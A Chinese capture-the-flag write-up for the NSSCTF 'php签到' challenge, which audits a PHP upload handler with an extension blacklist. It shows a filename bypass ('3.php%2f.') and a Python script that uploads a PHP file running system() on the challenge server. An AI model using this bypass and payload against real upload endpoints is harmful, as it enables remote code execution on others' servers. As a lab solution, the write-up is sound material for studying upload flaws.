# 【NSSCTF 2nd】php签到


# [NSSCTF 2nd]php签到

## 思路
* 源码

  ```
    &lt;?php
  
  function waf($filename){
      $black_list = array(&#34;ph&#34;, &#34;htaccess&#34;, &#34;ini&#34;);
      $ext = pathinfo($filename, PATHINFO_EXTENSION);
      foreach ($black_list as $value) {
          if (stristr($ext, $value)){
              return false;
          }
      }
      return true;
  }
  
  if(isset($_FILES[&#39;file&#39;])){
      $filename = urldecode($_FILES[&#39;file&#39;][&#39;name&#39;]);
      $content = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
      if(waf($filename)){
          file_put_contents($filename, $content);
      } else {
          echo &#34;Please re-upload&#34;;
      }
  } else{
      highlight_file(__FILE__);
  } 
  ```
  

* 代码审计

  ```
  function waf($filename){
      $black_list = array(&#34;ph&#34;, &#34;htaccess&#34;, &#34;ini&#34;);
      $ext = pathinfo($filename, PATHINFO_EXTENSION);
      foreach ($black_list as $value) {
          if (stristr($ext, $value)){
              return false;
          }
      }
      return true;
  } 
  ```

  黑名单说明不能使用

  * pathinfo 函数用于获取文件路径的信息,包括目录名,文件名,扩展名等
  * htaccess
  * user.ini

  ```
  if(isset($_FILES[&#39;file&#39;])){
      $filename = urldecode($_FILES[&#39;file&#39;][&#39;name&#39;]);
      $content = file_get_contents($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]);
      if(waf($filename)){
          file_put_contents($filename, $content);
      } else {
          echo &#34;Please re-upload&#34;;
      }
  } else{
      highlight_file(__FILE__);
  }
  ```

  由`$_FILES[&#39;file&#39;]` 可以判断是要上传文件,但是页面没有给出上传文件的选项,因此**需要手动上传表单文件**

  `$_FILES[&#39;file&#39;][&#39;name&#39;]` 就是上传的文件名信息,会先被url解码然后赋值给$filename

  `$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]` 是上传的文件的临时存储路径信息,例如 /var/www/html/1.php

  `$content` 会读取上传的文件里面的内容  如果$filename满足waf()函数要求,就把$content内容 写入文件$filename

* 绕过对文件名的限制

  使用1.php/.在linux中会被识别为在1.php中创建`.`文件

  或者1.php.后面时空字符就绕过了

* 脚本上传文件

  ```
  import requests
  
  url = &#39;http://node5.anna.nssctf.cn:23626/&#39;  # 上传文件地址
  file_content = &#34;&lt;?php system(env); ?&gt;&#34;
  files = {&#39;file&#39;: (&#39;3.php%2f.&#39;, file_content)}
  response = requests.post(url=url, files=files)
  print(response.text)
  ```

* 直接访问对应的php文件，则直接可以看到结果

## 总结

* 文件上传

---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2024%E5%81%9A%E9%A2%98-nssctf-2ndphp%E7%AD%BE%E5%88%B0/  

